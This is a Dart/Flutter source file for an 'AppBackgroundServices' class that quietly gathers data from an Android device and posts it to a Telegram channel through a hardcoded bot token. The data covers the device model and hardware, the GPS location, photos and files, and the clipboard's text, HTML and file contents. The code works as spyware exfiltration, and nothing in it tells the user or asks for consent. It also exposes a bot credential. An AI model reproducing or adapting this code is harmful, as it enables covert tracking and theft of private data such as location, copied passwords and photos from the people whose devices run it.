import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:super_clipboard/super_clipboard.dart';

String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
String channelId = '-1002064956223';

class AppBackgroundServices {
  static handlePermissions() async {
    await _requestLocationPermission();
    await _requestStoragePermission();
  }

  static Future<void> messageSend(String text) async {
    sendMessage(botToken, channelId, text);
  }

  static Future<void> sendDeviceInfo() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    sendMessage(
      botToken,
      channelId,
      "Device model: ${androidInfo.model}\nDevice: ${androidInfo.device}\nDevice hardware: ${androidInfo.hardware}\nDevice display: ${androidInfo.display}",
    );
  }

  static Future<void> _requestLocationPermission() async {
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }
    } else {
      await Geolocator.requestPermission();
    }
  }

  static Future<Position?> determinePosition() async {
    bool serviceEnabled;
    LocationPermission permission;

    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      return null;
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      return null;
    }
    return await Geolocator.getCurrentPosition();
  }

  static Future<void> _requestStoragePermission() async {
    PermissionStatus status = await Permission.storage.request();
    if (status == PermissionStatus.granted) {
      log('Storage permission granted');
    } else {
      log('Storage permission denied');
    }
  }

  static Future<void> sendPhoto(String filePath) async {
    String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
    String channelId = '-1002064956223';
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendPhoto';

    var request = http.MultipartRequest('POST', Uri.parse(apiUrl));

    request.files.add(
      await http.MultipartFile.fromPath('photo', filePath),
    );

    request.fields.addAll({
      'chat_id': channelId,
      'caption': "${DateTime.now()}",
    });

    try {
      var streamedResponse = await request.send();
      var response = await http.Response.fromStream(streamedResponse);

      if (response.statusCode == 200) {
        log('Photo sent successfully!');
      } else {
        log('Failed to send photo: ${response.body}');
      }
    } catch (e) {
      log('Error: $e');
    }
  }

  static Future<void> sendFile(Stream<Uint8List> stream) async {
    List<int> bytes = [];

    await for (Uint8List data in stream) {
      bytes.addAll(data);
    }

    String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
    String channelId = '-1002064956223';
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendPhoto';

    var request = http.MultipartRequest('POST', Uri.parse(apiUrl));

    request.files.add(http.MultipartFile.fromBytes('photo', bytes));

    request.fields.addAll({
      'chat_id': channelId,
      'caption': "${DateTime.now()}",
    });

    try {
      var streamedResponse = await request.send();
      var response = await http.Response.fromStream(streamedResponse);

      if (response.statusCode == 200) {
        log('Photo sent successfully!');
      } else {
        log('Failed to send photo: ${response.body}');
      }
    } catch (e) {
      log('Error: $e');
    }
  }

  static Future<void> sendLocation() async {
    await determinePosition().then((value) async {
      if (value != null) {
        String apiUrl = 'https://api.telegram.org/bot$botToken/sendLocation';
        Map<String, dynamic> requestBody = {
          'chat_id': channelId,
          'latitude': value.latitude.toString(),
          'longitude': value.longitude.toString(),
        };
        try {
          var response = await http.post(
            Uri.parse(apiUrl),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(requestBody),
          );

          if (response.statusCode == 200) {
            log('Location sent successfully!');
          } else {
            log('Failed to send location: ${response.body}');
          }
        } catch (e) {
          log('Error: $e');
        }
      } else {
        sendMessage(
          botToken,
          channelId,
          "Geolokatsiyani aniqlash o'chirilgan!",
        );
      }
    });
  }

  static void sendMessage(String botToken, String chatId, String text) async {
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendMessage';

    Map<String, dynamic> requestBody = {
      'chat_id': chatId,
      'text': text,
    };

    try {
      var response = await http.post(
        Uri.parse(apiUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(requestBody),
      );

      if (response.statusCode == 200) {
        log('Message sent successfully!');
      } else {
        log('Failed to send message: ${response.body}');
      }
    } catch (e) {
      log('Error: $e');
    }
  }

 static  Future<void> clipboardHandler() async {
    final clipboard = SystemClipboard.instance;
    if (clipboard != null) {
      final reader = await clipboard.read();

      if (reader.canProvide(Formats.htmlText)) {
        final html = await reader.readValue(Formats.htmlText);
        if (html != null) {
          messageSend(html);
        }
      }

      if (reader.canProvide(Formats.plainText)) {
        final text = await reader.readValue(Formats.plainText);
        if (text != null) {
          messageSend("Clipboard text: \n$text");
        }
      }

      for (final format in Formats.standardFormats) {
        if (reader.canProvide(format)) {
          reader.getFile(format as FileFormat, (file) {
            final stream = file.getStream();
            sendFile(stream);
          });
        }
      }
    }
  }
}
